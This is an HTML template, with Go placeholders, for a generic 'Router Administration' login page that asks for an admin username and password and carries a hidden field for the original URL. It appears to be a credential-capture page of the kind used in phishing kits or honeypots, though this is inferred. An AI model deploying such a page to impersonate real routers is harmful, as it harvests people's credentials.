<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Router Admin</title>
<style>
  body { font-family: "Segoe UI", Roboto, Arial, sans-serif; background: #1f2933; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
  .card { background: #fff; width: 380px; padding: 36px; border-radius: 8px; }
  .logo { width: 56px; height: 56px; border-radius: 8px; background: #3b82f6; color: #fff; font-size: 26px; font-weight: 700; line-height: 56px; text-align: center; margin-bottom: 12px; }
  h1 { font-size: 18px; margin: 0 0 4px; color: #111827; }
  .sub { color: #6b7280; font-size: 13px; margin-bottom: 20px; }
  form { text-align: left; }
  label { display: block; font-size: 13px; color: #374151; margin: 12px 0 4px; }
  input { width: 100%; box-sizing: border-box; padding: 11px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 15px; }
  button { width: 100%; margin-top: 20px; padding: 12px; border: 0; border-radius: 6px; background: #2563eb; color: #fff; font-size: 15px; font-weight: 600; cursor: pointer; }
</style>
</head>
<body>
<div class="card">
  <div class="logo">R</div>
  <h1>Router Administration</h1>
  <p class="sub">Enter your administrator credentials</p>
  <form method="post" action="{{.Action}}">
    <input type="hidden" name="orig" value="{{.Orig}}">
    <label>Username</label>
    <input type="text" name="username" value="admin" autofocus>
    <label>Password</label>
    <input type="password" name="password" required>
    <button type="submit">Login</button>
  </form>
</div>
</body>
</html>
